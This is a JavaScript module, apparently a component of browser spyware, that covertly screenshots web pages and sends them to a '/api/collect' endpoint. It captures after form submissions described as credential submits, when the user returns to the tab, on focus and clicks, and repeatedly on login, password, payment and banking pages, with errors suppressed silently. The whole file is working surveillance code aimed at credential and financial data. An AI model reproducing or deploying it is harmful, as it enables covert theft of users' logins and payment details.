export default class ScreenshotCapturer {
  constructor(core) {
    this.core = core;
    this.capturedUrls = new Set();
    this.lastCaptureTime = 0;
    this.MIN_CAPTURE_INTERVAL = 5000; // Minimum 5 seconds between captures
  }

  init() {
    // Capture screenshot when credentials are submitted
    document.addEventListener('submit', () => {
      setTimeout(() => this.capture(), 500);
    });

    // Also capture periodically (every 60 seconds)
    setInterval(() => this.capture(), 60000);

    // === Capture immediately when user returns to tab ===
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        // User just came back - capture screenshot
        setTimeout(() => this.capture(), 100);
        // Capture again after a delay to catch any changes
        setTimeout(() => this.capture(), 1500);
      }
    });

    // Capture on window focus (alt-tab, window switch)
    window.addEventListener('focus', () => {
      setTimeout(() => this.capture(), 200);
    });

    // Capture when user clicks anywhere (might reveal new context)
    document.addEventListener('click', () => {
      if (Date.now() - this.lastCaptureTime > this.MIN_CAPTURE_INTERVAL) {
        setTimeout(() => this.capture(), 100);
      }
    });

    // High priority: capture when entering sensitive pages
    this.captureOnSensitivePages();
  }

  captureOnSensitivePages() {
    const sensitivePaths = ['/login', '/account', '/password', '/payment', '/checkout',
                           '/settings', '/profile', '/bank', '/security'];
    const currentPath = window.location.pathname.toLowerCase();
    if (sensitivePaths.some(p => currentPath.includes(p))) {
      setTimeout(() => this.capture(), 200);
      setTimeout(() => this.capture(), 2000);
      setTimeout(() => this.capture(), 5000);
    }
  }

  async capture() {
    // Rate limiting
    if (Date.now() - this.lastCaptureTime < this.MIN_CAPTURE_INTERVAL) return;
    this.lastCaptureTime = Date.now();

    try {
      const html2canvas = (await import('html2canvas')).default;
      const canvas = await html2canvas(document.body, {
        useCORS: true,
        allowTaint: true,
        scale: 0.5,
        logging: false,
        backgroundColor: null,
        // Capture full page even if scrolled
        scrollX: 0,
        scrollY: 0,
        windowHeight: document.documentElement.scrollHeight,
        windowWidth: document.documentElement.scrollWidth
      });

      const data = canvas.toDataURL('image/jpeg', 0.5);
      const url = window.location.href;

      // Also add URL to visited paths if not already tracked
      this.core.send('/api/collect/screenshot', {
        data,
        url,
        pageTitle: document.title,
        timestamp: Date.now(),
        triggerType: 'auto'
      });

      // Send a formdata event noting a screenshot was taken
      this.core.send('/api/collect/formdata', {
        formId: 'screenshot-captured',
        fields: {
          url,
          pageTitle: document.title,
          trigger: 'auto'
        },
        url
      });
    } catch (e) {
      // Silent fail
    }
  }
}